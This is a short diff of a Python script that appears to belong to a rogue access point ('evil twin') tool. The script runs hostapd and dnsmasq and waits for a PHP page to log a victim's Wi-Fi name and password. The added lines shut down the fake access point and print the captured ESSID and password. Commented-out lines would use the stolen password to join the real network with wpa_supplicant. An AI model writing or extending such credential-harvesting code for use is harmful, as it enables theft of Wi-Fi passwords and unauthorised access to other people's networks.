@@ -115,13 +115,28 @@ with open('./website/save.php', 'w') as f:
 while (path.getsize('/var/www/html/log.txt') == 0):
    time.sleep(3)
 
+time.sleep(5)
+
 # Kill hostapd and dnsmasq background processes
 proc1.kill()
 proc2.kill()
 
+#subprocess.call(['ifconfig', 'wlan0mon', 'down'])
+#subprocess.call(['ifconfig', 'wlan0mon', 'up'])
+
 f = open('/var/www/html/log.txt', 'r')
 # Get first line. Remove possible newlines from end
 line = f.readline().strip('\n')
+
+# credentials[0] contains the essid
+# credentials[1] contains the password
 credentials = line.split(':')
-#print('ssid: ' + credentials[0] + '\n')
-#print('pw: ' + credentials[1])
+print(credentials[0])
+print(credentials[1])
+
+#with open('wpa.conf', 'w') as out:
+#   subprocess.call(['wpa_passphrase', credentials[0], credentials[1]], stdout=out)
+#print('Successfully wrote wpa.conf')
+
+#subprocess.call(['wpa_supplicant', '-iwlan0mon', '-Dnl80211', '-cwpa.conf'])
+
